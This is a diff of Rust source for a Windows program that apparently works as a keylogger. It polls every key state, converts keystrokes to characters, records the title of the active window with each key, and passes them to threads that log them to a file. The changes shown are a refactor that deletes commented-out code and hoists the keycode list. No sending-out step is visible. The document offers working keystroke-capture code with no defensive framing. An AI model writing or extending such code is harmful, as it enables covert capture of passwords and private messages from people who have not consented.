@@ -30,26 +30,11 @@ struct Key {
     window_title: String,    // The title of the window that was active when the key was pressed
 }
 
-/*impl Key {
-    fn new() -> Self {
-        Self {
-            is_control: true,
-            char: None,
-            keycode: 0,
-        }
-    }
-}
-*/
-
 fn main() {
     let (tx1, rx1) = channel::<Key>();
     let (tx2, rx2) = channel::<Key>();
 
-    // let keys1 = Arc::new(Mutex::new(vec![]));
     let keys1 = Arc::new(Mutex::new(Vec::<Key>::new()));
-
-    // Collection thread
-    // let h1 = thread::spawn(move || );
 
     // Print all received keys to a file for debugging
     let h2 = thread::spawn(move || {
@@ -109,8 +94,9 @@ fn main() {
         }
     });
 
+    let keycodes = get_main_key_codes();
     loop {
-        let next_key = get_next();
+        let next_key = get_next(&keycodes);
 
         tx1.send(next_key.clone()).unwrap();
         tx2.send(next_key.clone()).unwrap();
@@ -153,18 +139,15 @@ fn get_address() -> String {
     }
 }
 
-fn get_next() -> Key {
+fn get_next(keycodes: &[i32]) -> Key {
     let mut keyboard_state = [0u8; 256];
 
-    let next = wait_for_next_key();
+    let next = wait_for_next_key(&keycodes);
     // println!("next: {:?}", next);
     let t = unsafe { GetKeyboardState(&mut keyboard_state) };
 
-    // Get the handle to the foreground window
     let foreground_window = unsafe { GetForegroundWindow() };
-    // Get the thread id of the foreground window
     let thread_id = unsafe { GetWindowThreadProcessId(foreground_window, None) };
-    // Get the keyboard layout for the foreground thread
     let layout = unsafe { GetKeyboardLayout(thread_id) };
     let mut pwszbuff = [0u16; 1]; // Create a buffer
                                   // Use the correct arguments for ToUnicodeEx
@@ -178,20 +161,12 @@ fn get_next() -> Key {
             layout,
         )
     };
-    // println!("typeing {}: {} kb: {:?}", i, code, layout);
-    // println!(">>> buff {:?}",  pwszbuff);
 
     // Add the code to get the window title
     let mut window_title = vec![0u16; 1024]; // Create a buffer for the window title
     let title_length = unsafe { GetWindowTextW(foreground_window, &mut window_title) };
     window_title.resize(title_length as usize, 0); // Resize the vector to fit the title
     let window_title = String::from_utf16(&window_title).unwrap_or_default(); // Convert the title to a String
-
-    // println!("Window title: {}", window_title); // Print the window title
-
-    // let mut key = Key::new();
-    // key.is_control = false;
-    // key.keycode = next;
 
     let mut key = Key {
         keycode: next,
@@ -201,31 +176,22 @@ fn get_next() -> Key {
         window_title,
     };
 
-    // let code_point: u32 = 1567; ///ssssfqwewerdfgrtasd
     let code_point: u32 = pwszbuff[0] as u32;
     if let Some(character) = char::from_u32(code_point) {
-        // let character = character.to_string();
         if character.is_control() {
-            // println!("{} is a control character", code_point);
             key.is_control = true;
             key.control = win_key_to_string(next);
         } else {
             key.char = Some(character);
-            let character_string = character.to_string();
-            // println!("{}", character_string);
         }
-        // println!(">>> {}", character_string);
     } else {
         key.is_control = true;
-        key.control = win_key_to_string(next);
-        // println!("Invalid Unicode code point: {}", code_point);
     };
 
     key
 }
 
-fn wait_for_next_key() -> i32 {
-    let keycodes = get_main_key_codes();
+fn wait_for_next_key(keycodes: &[i32]) -> i32 {
     let mut last_key: Option<i32> = None;
     loop {
         for &key in keycodes.iter() {
@@ -238,13 +204,10 @@ fn wait_for_next_key() -> i32 {
                 }
                 continue;
             }
-            // println!("key: {} code: {}", key, key_code );
 
             // The shift is for only pressed key
             if key_code != -32768 || key_code & (1 << 15) == 0 {
-                // if key_code != -32768 {
-                // if key_code & (1 << 15) == 0 {
-                // continue;
+                continue;
             }
             last_key = Some(key);
         }
@@ -252,16 +215,15 @@ fn wait_for_next_key() -> i32 {
     }
 }
 
+// todo to global static
 fn get_main_key_codes() -> Vec<i32> {
     let mut keycodes = vec![];
     // Iterate from 0 to 255 inclusive
     for i in 0..=255 {
-        // keycodes.push(i);
         if is_known_win_key(i) {
             keycodes.push(i); //todo
         }
     }
-    // println!("keycodes: {:?}", keycodes);
     keycodes
 }
 
@@ -399,9 +361,10 @@ fn win_key_to_string(win_key1: i32) -> Option<String> {
         (VK_PRINT, "[print]"),
     ];
 
-    let vk = VIRTUAL_KEY(win_key1 as u16);
+    // todo: to global static
+    let vk = win_key1 as u16;
     for (key, string) in known_keys {
-        if key.0 == vk.0 {
+        if key.0 == vk {
             return Some(string.to_string());
         }
     }
